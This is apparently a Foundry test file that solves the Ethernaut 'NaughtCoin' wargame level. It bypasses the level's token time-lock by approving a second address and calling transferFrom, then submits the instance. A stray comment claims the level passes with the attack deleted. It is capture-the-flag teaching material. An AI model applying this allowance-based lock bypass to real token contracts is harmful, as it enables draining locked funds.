pragma solidity ^0.8.10;

import "ds-test/test.sol";
import "../NaughtCoin/NaughtCoinFactory.sol";
import "../Ethernaut.sol";
import "./utils/vm.sol";

contract NaughtCoinTest is DSTest {
    Vm vm = Vm(address(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D));
    Ethernaut ethernaut;

    function setUp() public {
        // Setup instance of the Ethernaut contracts
        ethernaut = new Ethernaut();
    }

    // This level passes despite the level attack being deleted...

    function testNaughtCoinHack() public {
        /////////////////
        // LEVEL SETUP //
        /////////////////

        NaughtCoinFactory naughtCoinFactory = new NaughtCoinFactory();
        ethernaut.registerLevel(naughtCoinFactory);
        vm.startPrank(tx.origin);
        address levelAddress = ethernaut.createLevelInstance(naughtCoinFactory);
        NaughtCoin ethernautNaughtCoin = NaughtCoin(payable(levelAddress));

        //////////////////
        // LEVEL ATTACK //
        //////////////////
        address alice = address(0x67);
        uint256 balance = ethernautNaughtCoin.balanceOf(tx.origin);
        ethernautNaughtCoin.approve(alice, balance);
        vm.stopPrank();
        
        vm.startPrank(alice);
        ethernautNaughtCoin.transferFrom(tx.origin, alice, balance);
        vm.stopPrank();

        assertEq(ethernautNaughtCoin.balanceOf(tx.origin), 0, "tx.origin non-zero balance");

        //////////////////////
        // LEVEL SUBMISSION //
        //////////////////////
        vm.startPrank(tx.origin);
        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress));
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}